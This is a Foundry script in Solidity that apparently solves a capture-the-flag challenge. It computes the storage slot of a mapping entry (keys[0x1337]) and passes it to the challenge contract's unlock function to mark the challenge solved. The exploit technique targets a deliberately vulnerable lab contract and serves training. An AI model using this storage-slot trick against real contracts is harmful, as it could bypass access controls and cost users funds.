// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/GuessIt.sol";

contract SolveChallenge is Script {
    address setupAddress = vm.envAddress("SETUP_ADDRESS");
    uint privateKey = vm.envUint("PRIVATE_KEY");

    
    // The key that we are looking for in the keys mapping
    uint constant isKey = 0x1337;

    function run() public {
        // Start broadcasting with the private key
        vm.startBroadcast(privateKey);

        // Attach to the Setup contract
        Setup setup = Setup(setupAddress);

        // Check if the challenge is already solved
        if (setup.isSolved()) {
            console.log("Challenge already solved.");
            return;
        }

        // Attach to the EasyChallenge contract
        EasyChallenge challenge = EasyChallenge(address(setup.challengeInstane()));

        // Calculate the correct slot for the key in the 'keys' mapping
        // The mapping 'keys' is at slot 1 (after 'isKey') in the contract, and we are looking for keys[isKey]
        bytes32 slot = keccak256(abi.encodePacked(uint(0x1337), uint(1)));

        // Now, unlock using the correct slot
        challenge.unlock(uint(slot));

        // Check if the challenge is solved
        if (setup.isSolved()) {
            console.log("Challenge solved!");
        } else {
            console.log("Challenge not solved.");
        }

        vm.stopBroadcast();
    }
    
}

